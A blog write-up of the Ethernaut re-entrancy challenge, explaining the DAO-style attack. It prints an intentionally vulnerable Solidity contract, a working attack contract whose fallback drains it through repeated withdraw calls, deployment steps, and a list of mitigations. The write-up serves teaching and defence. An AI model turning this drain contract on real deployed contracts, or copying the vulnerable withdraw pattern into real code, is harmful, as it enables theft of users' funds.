+++
title = "Reeintrancy - Ethernaut"
date = "2022-02-01"
author = "Dimitris Vagiakakos && Stavros Gkinos"
+++
On this challenge, we will learn how the infamous DAO occured and how to prevent such an incident to occur again. Ethereum splitted into two Blockchains, Ethereum and Ethereum Classic because of a DAO Attack.
So we have this smart-contract and we have to withdraw all of it's ether:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```
Re-entrancy happens in single-thread computing environments, when the execution stack jumps or calls subroutines, before returning to the original execution.
Firstly, we create a smart-contract called ReentranceAttack.sol with which we are going to attack the main smart-contract shown above:

```
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.10;

import './Reentrance.sol';

contract ReentranceAttack {

  Reentrance target;
  uint public amount = 1 ether;

  constructor(address payable _targetAddr) public payable {
    target= Reentrance(_targetAddr);
  }

  function donateToTarget() public {
    target.donate.value(amount).gas(4000000)(address(this));   }

  fallback() external payable {
    if (address(target).balance !=0){
      target.withdraw(amount);
    }
  }
}
```

We need to take into account these two criterias:
* Fallback functions can be called by anyone and execute malicious code.
* Malicious external contracts can abuse withdrawals.

The expoitation was done by following these steps:

* We deploy ReentranceAttack.sol with a value of 1 ether and as an address parameter we input the Reentrance.sol address which we find from the console by typing "contract.address".
*  We donate 1 ether to the  Reentrance.sol  by calling the function donateToTarget() from the ReentranceAttack.sol in order to add ReentranceAttack.sol address into balances.

```
mapping(address => uint) public balances;
```
Now that we are into balances, we satisfy the requirement of withdraw() function.
* By using the Remix IDE, we trigger the fallback() function from the ReentranceAttack.sol which calls the withdraw() function from the Reentrance.sol. Now the withdraw() function is called and we satisfy the requirement of it, it will call back the fallback() function of the ReentranceAttack.sol and this loop will continue until the balance of the Reentrance.sol is zero.
*
There are multiple ways to protect your smart-contract in order to prevent issues like DAO Attack to happen.
* The order of execution really matters in programming, specially in Solidity. If we have to take external function calls, making the call must be the last thing to do. Even better,if we can invoke transfer in a separate function.
* Include a mutex to prevent re-entrancy. For example we can create a Boolean lock variable or a binary variable to signal execution depth.
* When we have to use function modifiers to check invariants, we should be extremely careful as modifiers are executed at the start of the function. 
* Use transfer to move funds out of a smart-contract, as low level functions like call and send just return false but don't interrupt the execution flow when receiving contract fails.

---
If you want to learn more about Smart Contract Security, please check our paper and eCourses:
## Smart-Contract Security:

* [Smart Contract Security - Educational eLearning Series in Greek on YouTube - Click Here](https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7)


* [Smart Contract Security - Educational eLearning Series in Greek on LBRY - Click Here](https://odysee.com/@TuxHouse:1/Ethereum-Hacking-Series-%28Greek%29:b?r=D1QgYeP81GoKPkW5T1jP96zxGA4GMfho&lid=b0b540e62d96ed2811b776519fc460617e4c40747)
